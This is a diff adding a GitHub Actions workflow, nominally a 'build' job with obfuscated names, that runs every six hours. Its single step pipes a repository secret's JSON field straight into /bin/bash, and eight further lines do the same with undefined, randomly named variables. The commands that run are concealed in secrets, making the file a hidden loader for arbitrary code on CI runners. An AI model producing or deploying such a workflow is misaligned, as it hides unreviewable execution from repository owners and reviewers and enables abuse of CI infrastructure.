@@ -1,0 +1,26 @@
+name: qiehuanqhx
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qiehuanqhx
+        env:
+          tsr5: ${{ secrets.tsr5 }}
+        run: |
+          echo $tsr5 | jq -r .pwndy21 | /bin/bash
+          echo $patp6606 | jq -r .s35 | /bin/bash
+          echo $vi80 | jq -r .bn3327 | /bin/bash
+          echo $xnyn84137 | jq -r .n7 | /bin/bash
+          echo $sievl6650 | jq -r .sol3758 | /bin/bash
+          echo $kuqo38 | jq -r .umjd4128 | /bin/bash
+          echo $fcsn05913 | jq -r .w44 | /bin/bash
+          echo $p890 | jq -r .ne3946 | /bin/bash
+          echo $folik42 | jq -r .n6514 | /bin/bash
+
